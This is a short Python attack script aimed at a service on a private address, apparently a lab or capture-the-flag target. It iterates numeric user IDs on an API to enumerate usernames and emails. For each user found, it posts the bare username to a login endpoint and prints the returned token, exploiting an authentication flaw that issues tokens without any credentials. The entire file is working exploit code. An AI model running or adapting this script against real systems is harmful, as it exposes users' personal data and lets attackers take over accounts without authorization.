import urllib.request
import urllib.parse
import json

users_base = "http://10.110.3.72:8014/api/users/"
login_url = "http://10.110.3.72:8015/login"

id = 1
not_found_count = 0
MAX_MISSES = 3

print("Starting user enumeration and token extraction...")

while not_found_count < MAX_MISSES:
    user_url = f"{users_base}{id}"
    try:
        # Fetch user info from port 8014
        req = urllib.request.urlopen(user_url, timeout=2)
        data = json.loads(req.read().decode("utf-8"))
        username = data.get("username")
        print(f"\n[+] Found User [ID {id}]: {username} ({data.get('email')})")
        not_found_count = 0  # Reset counter on success
        
        # Request login token from port 8015
        post_data = urllib.parse.urlencode({"user": username}).encode("utf-8")
        login_req = urllib.request.Request(login_url, data=post_data, method="POST")
        
        try:
            login_resp = urllib.request.urlopen(login_req, timeout=2)
            login_data = json.loads(login_resp.read().decode("utf-8"))
            print(f"    Token / Response:")
            print(json.dumps(login_data, indent=4))
        except Exception as e:
            print(f"    [-] Login failed for {username}: {e}")

    except Exception:
        print(f"[-] ID {id} not found.")
        not_found_count += 1

    id += 1

print("\nFinished!")
